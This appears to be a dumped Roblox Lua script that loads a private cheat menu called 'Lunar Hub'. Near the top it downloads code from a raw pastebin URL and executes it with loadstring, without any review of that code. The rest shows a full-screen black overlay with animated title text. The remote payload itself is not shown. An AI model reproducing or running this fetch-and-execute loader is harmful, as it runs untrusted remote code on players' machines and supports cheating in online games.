local RunService = game:GetService("RunService")
local HeartbeatConnection = RunService.Heartbeat:Connect(function(deltaTime)
end)
task.wait()
HeartbeatConnection:Disconnect()
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local v1 = game:GetService("RunService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
loadstring(game:HttpGet("https://pastebin.com/raw/m95MZdGX"))()
-- Dumped loadstring content to: dumped_loadstring_1.lua
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "NoAccess"
ScreenGui.ResetOnSpawn = false
ScreenGui.IgnoreGuiInset = true
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = PlayerGui
local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(1, 0, 1, 0)
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BackgroundTransparency = 0
Frame.BorderSizePixel = 0
Frame.ZIndex = 1
local TextLabel = Instance.new("TextLabel", ScreenGui)
TextLabel.Size = UDim2.new(1, -80, 0, 120)
TextLabel.Position = UDim2.new(0, 40, 0.5, -140)
TextLabel.BackgroundTransparency = 1
TextLabel.Text = ""
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 100
TextLabel.Font = Enum.Font.GothamBold
TextLabel.TextXAlignment = Enum.TextXAlignment.Center
TextLabel.ZIndex = 2
local v2 = Instance.new("TextLabel", ScreenGui)
v2.Size = UDim2.new(1, -80, 0, 40)
v2.Position = UDim2.new(0, 40, 0.5, 20)
v2.BackgroundTransparency = 1
v2.Text = ""
v2.TextColor3 = Color3.fromRGB(160, 160, 160)
v2.TextSize = 26
v2.Font = Enum.Font.Gotham
v2.TextXAlignment = Enum.TextXAlignment.Center
v2.ZIndex = 2
task.spawn(function()
    local title = "Lunar Hub"
    local subtitle = "Private Script - Friends Only"

    TextLabel.Text = ""
    v2.Text = ""

    -- Animate title slowly
    for i = 1, #title do
        TextLabel.Text = string.sub(title, 1, i)
        task.wait(0.15) -- speed of typing
    end

    task.wait(0.5)

    -- Animate subtitle
    for i = 1, #subtitle do
        v2.Text = string.sub(subtitle, 1, i)
        task.wait(0.05)
    end
end)
